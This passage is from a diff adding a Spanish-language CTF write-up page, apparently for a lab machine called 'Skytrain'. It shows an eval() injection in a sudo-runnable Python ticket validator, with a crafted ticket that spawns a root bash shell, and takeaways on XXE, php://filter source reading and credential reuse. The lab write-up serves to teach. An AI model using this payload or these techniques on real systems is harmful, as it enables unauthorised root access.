+          <span class="screenshot-label">/opt/skytrain_inc/</span>
+        </div>
+        <img src="img/skytrain_ls.png" alt="ls mostrando ticketValidator.py e invalid_tickets" />
+      </div>
+
+      <h3>Análisis de ticketValidator.py</h3>
+      <p>El script valida archivos <code>.md</code> con un formato específico y usa <code>eval()</code> sobre la línea del código del ticket. El flujo es:</p>
+
+      <table class="info-table">
+        <tr><td>Línea 1</td><td>Debe empezar con <code># Skytrain Inc</code></td></tr>
+        <tr><td>Línea 2</td><td>Debe empezar con <code>## Ticket to</code></td></tr>
+        <tr><td>Código</td><td>Sección <code>__Ticket Code:__</code> — línea siguiente es evaluada</td></tr>
+        <tr><td>Condición</td><td><code>número % 7 == 4</code> para continuar</td></tr>
+        <tr><td>Fallo crítico</td><td><code>eval()</code> ejecuta cualquier expresión Python válida</td></tr>
+      </table>
+
+      <div class="callout">
+        <div class="callout-title">💀 eval() con sudo = root garantizado</div>
+        <p><code>eval()</code> ejecuta cualquier código Python que reciba como input. Si controlamos ese input y el script corre como root con <code>sudo</code>, podemos inyectar comandos del sistema.</p>
+      </div>
+
+      <h3>Python eval() Abuse — shell como root</h3>
+      <p>El número <code>179</code> cumple la condición (<code>179 % 7 = 4</code>). Usamos el operador <code>and</code> para encadenar la ejecución de un comando del sistema:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-comment"># Creamos el ticket malicioso</span>
+<span class="c-prompt">❯</span> <span class="c-cmd">cat &gt; /tmp/f.md &lt;&lt; 'EOF'
+# Skytrain Inc
+## Ticket to Mars
+__Ticket Code:__
+**179 + 25 == 204 and __import__('os').system('/bin/bash') == True
+EOF</span>
+
+<span class="c-comment"># Ejecutamos como root</span>
+<span class="c-prompt">❯</span> <span class="c-cmd">sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</span>
+Please enter the path to the ticket file: <span class="c-key">/tmp/f.md</span></div>
+      </div>
+
+      <div class="screenshot">
+        <div class="screenshot-bar">
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <span class="screenshot-label">Shell como root</span>
+        </div>
+        <img src="img/rce_root.png" alt="Terminal mostrando uid=0(root) como resultado del eval" />
+      </div>
+
+      <p>Tenemos shell como <code>root</code>. Flag en <code>/root/root.txt</code>.</p>
+    </div>
+
+    <!-- LECCIONES -->
+    <div class="writeup-section reveal" id="lessons">
+      <div class="section-label">takeaways</div>
+      <h2>Lecciones <em>aprendidas</em></h2>
+
+      <div class="lessons-list">
+        <div class="lesson-item">
+          <div class="lesson-num">01</div>
+          <div class="lesson-body">
+            <div class="lesson-title">XXE no requiere un XML visible</div>
+            <div class="lesson-desc">Si una aplicación acepta datos en base64 o URL-encoded que al decodificarse resultan XML, sigue siendo vulnerable. Siempre intercepta y decodifica lo que envía el cliente antes de descartar un vector.</div>
+          </div>
+        </div>
+        <div class="lesson-item">
+          <div class="lesson-num">02</div>
+          <div class="lesson-body">
+            <div class="lesson-title">PHP filter wrappers como bypass estándar</div>
+            <div class="lesson-desc">Cuando <code>file://</code> no funciona para leer PHP via XXE, <code>php://filter/read=convert.base64-encode/resource=</code> resuelve tanto el conflicto de sintaxis XML como la ejecución server-side. Técnica imprescindible en stacks PHP.</div>
+          </div>
+        </div>
+        <div class="lesson-item">
+          <div class="lesson-num">03</div>
+          <div class="lesson-body">
+            <div class="lesson-title">eval() con sudo es escalada casi garantizada</div>
+            <div class="lesson-desc">Cualquier script que use <code>eval()</code> sobre input controlable y pueda ejecutarse como root vía <code>sudo</code> es explotable. El flujo de auditoría correcto: <code>sudo -l</code> → analizar el código del binario permitido → buscar funciones de evaluación dinámica.</div>
+          </div>
+        </div>
+        <div class="lesson-item">
+          <div class="lesson-num">04</div>
+          <div class="lesson-body">
+            <div class="lesson-title">Reutilización de credenciales en configuraciones</div>
+            <div class="lesson-desc">La contraseña de <code>db.php</code> era válida para el usuario <code>development</code> en SSH. En entornos reales este patrón es común: siempre prueba credenciales de archivos de configuración en todos los servicios disponibles.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- ── FOOTER ── -->
+<footer>
+  <div class="footer-logo">{ fl<em>0</em> } — © 2026</div>
+  <div class="footer-copy">built with &lt;3 · pentesting & sysadmin</div>
+</footer>
+
+<script>
+  // ── CURSOR ──
+  const cur  = document.getElementById('cursor');
+  const ring = document.getElementById('cursor-ring');
+  document.addEventListener('mousemove', e => {
+    cur.style.left = e.clientX + 'px';
+    cur.style.top  = e.clientY + 'px';
+    setTimeout(() => {
+      ring.style.left = e.clientX + 'px';
+      ring.style.top  = e.clientY + 'px';
+    }, 80);
+  });
+
+  // ── DARK MODE ──
+  function toggleTheme() {
+    const isDark = document.body.classList.toggle('dark');
+    document.getElementById('toggle-icon').textContent  = isDark ? '☀️' : '🌙';
+    document.getElementById('toggle-label').textContent = isDark ? 'light' : 'dark';
+    localStorage.setItem('theme', isDark ? 'dark' : 'light');
+  }
+  if (localStorage.getItem('theme') === 'dark') {
+    document.body.classList.add('dark');
+    document.getElementById('toggle-icon').textContent  = '☀️';
+    document.getElementById('toggle-label').textContent = 'light';
+  }
+
+  // ── COPY CODE ──
+  function copyCode(btn) {
+    const text = btn.closest('.code-block').querySelector('.code-body').innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'copiado ✓';
+      setTimeout(() => btn.textContent = 'copiar', 2000);
+    });
+  }
+
+  // ── REVEAL ON SCROLL ──
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); obs.unobserve(e.target); } });
+  }, { threshold: 0.08 });
+  document.querySelectorAll('.reveal').forEach(el => obs.observe(el));
+</script>
+</body>
+</html>
